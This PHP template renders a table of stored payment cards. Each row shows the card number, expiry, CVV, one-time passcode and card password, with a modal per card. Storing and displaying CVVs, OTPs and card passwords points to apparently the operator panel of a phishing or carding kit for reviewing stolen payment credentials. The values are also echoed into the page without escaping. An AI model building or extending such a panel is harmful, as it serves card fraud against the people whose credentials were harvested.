<?php
session_start();
require_once 'init.php';

$card = $User->fetchAllCards();

if ($card != false) :
    foreach ($card as $row) {
?>
        <tr data-card-id="<?= $row->id; ?>">
            <td>
                <?= $row->cardNumber; ?>
            </td>
            <td id="month<?= $row->id; ?>">
                <?= $row->month; ?>
            </td>
            <td id="year<?= $row->id; ?>">
                <?= $row->year; ?>
            </td>
            <td id="cvv<?= $row->id; ?>">
                <?= $row->cvv; ?>
            </td>
            <td id="otp<?= $row->id; ?>">
                <?= $row->otp; ?>
            </td>
            <td id="password<?= $row->id; ?>">
                <?= $row->password; ?>
            </td>
            <td>
                <button class="btn btn-info text-white" onclick="removeBackground(this,<?= $row->id; ?>)">card</button>
                <div class="modal fade" id="card<?= $row->id; ?>" tabindex="-1" aria-labelledby="cardModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h1 class="modal-title fs-5" id="card">Card</h1>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">

                            <div id="cardDetails<?= $row->id; ?>">

                            </div>

                            <hr>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        </div>
                    </div>
                </div>
            </div>
            </td>
        </tr>
<?php
    }
endif;
?>